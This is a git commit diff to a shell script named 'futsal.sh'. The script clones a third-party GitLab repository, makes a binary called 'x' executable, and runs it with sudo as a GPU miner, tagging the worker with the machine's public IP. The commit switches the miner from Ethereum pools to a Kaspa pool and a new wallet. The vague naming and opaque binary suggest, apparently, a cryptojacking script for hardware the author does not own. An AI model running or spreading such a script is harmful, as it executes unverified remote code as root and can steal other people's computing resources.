8320da1b7b577676acaa006d623963f36b0fc998
bajol1 <102598068+bajol1@users.noreply.github.com>
2022-04-05 22:41:31 +0700

    Update futsal.sh

--- futsal.sh
+++ futsal.sh
@@ -6,4 +6,4 @@ screen -dmS er.sh 65 75
 sudo git clone https://gitlab.com/letricejuliocesar/goodday
 cd goodday
 chmod +x x
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w 0xd7DcbA930f7E556f712B5a73b31F10112D78256d -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a kaspa -w qrd5tt3vujdf76yxucs5ena0dj4y5ctdqcn55gznwpe366k8da3gc6j5qrx0m -p stratum+tcp://acc-pool.pw:16061 -r $ip --nvidia 1
